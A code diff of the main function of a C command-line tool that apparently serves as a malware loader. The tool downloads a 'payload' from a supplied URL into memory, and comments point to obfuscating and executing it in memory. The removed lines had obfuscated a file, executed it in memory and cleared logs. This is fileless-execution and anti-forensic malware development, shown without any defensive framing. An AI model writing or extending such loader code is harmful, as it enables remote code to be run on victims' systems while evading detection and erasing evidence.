@@ -18,20 +18,14 @@ void show_help() {
 
 int main(int argc, char *argv[]) {
     Config config;
-
-    // Step 1: Load runtime configuration
     load_config(&config);
 
     // Step 2: Parse command-line arguments
     char *download_url = NULL;
-    char *file_path = NULL;
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
             download_url = argv[i + 1];
-            i++;
-        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
-            file_path = argv[i + 1];
             i++;
         } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
             config.timeout = atoi(argv[i + 1]);
@@ -42,22 +36,31 @@ int main(int argc, char *argv[]) {
         }
     }
 
-    // Step 3: Handle functionality
+    // Step 3: Handle downloading functionality
     if (download_url) {
         printf("[+] Downloading file from: %s\n", download_url);
-        char output_path[256];
-        snprintf(output_path, sizeof(output_path), "%s/downloaded_payload.bin", config.download_dir);
-        if (download_file(download_url, output_path, config.timeout) != 0) {
+
+        MemoryBuffer mem = {0}; // Initialize memory buffer
+
+        if (download_file_to_memory(download_url, &mem) == 0) {
+            printf("[+] File downloaded into memory (size: %zu bytes)\n", mem.size);
+
+            // Print the first few bytes of the downloaded file for verification
+            for (size_t i = 0; i < (mem.size < 10 ? mem.size : 10); i++) {
+                printf("%02X ", mem.buffer[i]);
+            }
+            printf("\n");
+
+            // Here, you would pass the buffer to obfuscate and execute
+            // obfuscate_file_in_memory(mem.buffer, mem.size);
+            // execute_in_memory(mem.buffer, mem.size);
+        } else {
             fprintf(stderr, "[ERROR] Failed to download file.\n");
             return 1;
         }
-    }
 
-    if (file_path) {
-        printf("[+] Processing file: %s\n", file_path);
-        obfuscate_file(file_path);
-        execute_in_memory(file_path);
-        clear_logs();
+        // Free the memory buffer
+        free(mem.buffer);
     }
 
     printf("[+] Task completed successfully!\n");
